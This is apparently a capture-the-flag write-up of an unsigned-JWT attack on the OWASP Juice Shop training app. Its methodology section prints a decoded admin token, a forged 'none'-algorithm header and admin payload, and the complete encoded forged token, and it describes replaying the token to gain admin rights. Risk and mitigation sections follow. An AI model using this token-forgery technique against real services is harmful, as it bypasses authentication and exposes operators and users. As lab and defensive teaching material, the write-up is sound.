## Methodology

1. **Initial Reconnaissance**
   - Identified the use of a vulnerable `express-jwt` library, which is known to be susceptible to unsigned JWT attacks when the `none` algorithm is used.
   - Intercepted a legitimate JWT token from an existing request to analyze its structure and payload.

2. **JWT Analysis**
   - Decoded the intercepted JWT using a tool like [jwt.io](https://jwt.io) to examine its header and payload:
     ```json
     {
       "alg": "HS256",
       "typ": "JWT"
     }
     ```
     ```json
     {
       "status": "success",
       "data": {
         "id": 1,
         "username": "admin",
         "email": "admin@juice-sh.op",
         "password": "4c850c5b3b2756e67a91bad8e046ddac",
         "role": "admin",
         "deluxeToken": "",
         "lastLoginIp": "10.240.112.196",
         "profileImage": "assets/public/images/uploads/defaultAdmin.png",
         "totpSecret": "",
         "isActive": true,
         "createdAt": "2026-02-23 10:19:48.989 +00:00",
         "updatedAt": "2026-03-09 11:47:51.572 +00:00",
         "deletedAt": null
       },
       "iat": 1773137134
     }
     ```

3. **Crafting the Unsigned JWT**
   - Created a new JWT with the `none` algorithm in the header to exploit the vulnerability:
     ```json
     {
       "typ": "JWT",
       "alg": "none"
     }
     ```
   - Forged a payload for a non-existent user (`jwtn3d@juice-sh.op`) with admin privileges:
     ```json
     {
       "status": "success",
       "data": {
         "id": 67,
         "username": "jwtn3d",
         "email": "jwtn3d@juice-sh.op",
         "password": "4c850c5b3b2756e67a91bad8e046ddac",
         "role": "admin",
         "deluxeToken": "",
         "lastLoginIp": "10.240.112.196",
         "profileImage": "assets/public/images/uploads/defaultAdmin.png",
         "totpSecret": "",
         "isActive": true,
         "createdAt": "2026-02-23 10:19:48.989 +00:00",
         "updatedAt": "2026-03-09 11:47:51.572 +00:00",
         "deletedAt": null
       },
       "iat": 1773137134
     }
     ```
   - Encoded the forged JWT to produce the final token:
     ```
     eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NjcsInVzZXJuYW1lIjoiand0bjNkIiwiZW1haWwiOiJqd3RuM2RAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjRjODUwYzViM2IyNzU2ZTY3YTkxYmFkOGUwNDZkZGFjIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEwLjI0MC4xMTIuMTk2IiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTAyLTIzIDEwOjE5OjQ4Ljk4OSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTAzLTA5IDExOjQ3OjUxLjU3MiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NzMxMzcxMzR9.
     ```

4. **Exploiting the Vulnerability**
   - Intercepted a legitimate request containing a JWT.
   - Replaced the original JWT with the forged unsigned JWT and forwarded the request.
   - Successfully gained admin privileges, as confirmed by the challenge flag.

### Tools Used
- **Burp Suite**: For intercepting and modifying HTTP requests.
- **[jwt.io](https://jwt.io)**: For decoding and crafting JWT tokens.

---

## Vulnerabilities

- **Vulnerability Type**: Unsigned JWT (CWE-347)
- **Affected Component**: Authentication system using `express-jwt` library
- **Severity Level**: **Critical**
  - Allows attackers to forge JWTs with arbitrary claims, bypassing authentication and authorization controls.

---

## Risks

- **Business Impact**:
  - **Unauthorized Access**: Attackers can impersonate any user, including admins, gaining full control over the application.
  - **Data Breach**: Unauthorized access to sensitive data, leading to potential exposure or manipulation.
  - **Reputational Damage**: Loss of customer trust due to perceived security weaknesses in authentication.
  - **Compliance Violations**: Potential non-compliance with data protection regulations if unauthorized access occurs.

---

## Actions

### Mitigation Strategies
- **Algorithm Whitelisting**: Ensure the JWT library only accepts strong, secure algorithms (e.g., HS256, RS256) and explicitly rejects `none`.
- **Input Validation**: Validate all JWTs on the server-side to ensure they are properly signed and contain expected claims.
- **Library Updates**: Update the `express-jwt` library and all related dependencies to their latest secure versions.

### Remediation Fixes
- **Secure JWT Configuration**: Configure the JWT library to enforce signed tokens and reject unsigned or weakly signed tokens.
- **Logging and Monitoring**: Implement logging and monitoring for JWT validation failures and unusual access patterns.
- **Multi-Factor Authentication**: Require multi-factor authentication for sensitive operations to add an extra layer of security.

### Best Security Practices
- **Regular Security Audits**: Conduct periodic security audits and penetration tests to identify and address vulnerabilities in authentication systems.
- **Developer Training**: Train developers on secure coding practices, with a focus on JWT security and authentication mechanisms.
- **Incident Response Plan**: Develop and maintain an incident response plan to quickly address and mitigate authentication breaches.
